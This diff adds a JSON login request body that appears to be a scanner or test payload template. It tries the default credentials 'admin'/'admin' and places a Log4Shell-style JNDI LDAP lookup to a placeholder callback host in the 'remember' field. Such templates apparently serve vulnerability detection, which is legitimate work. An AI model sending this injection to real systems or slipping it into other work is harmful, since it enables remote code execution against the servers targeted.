@@ -1,0 +1,6 @@
+{
+  "username": "admin",
+  "password": "admin",
+  "remember": "${jndi:ldap://%%CALLBACK_IP%%/%%ENDPOINT%%}",
+  "strict": true
+}
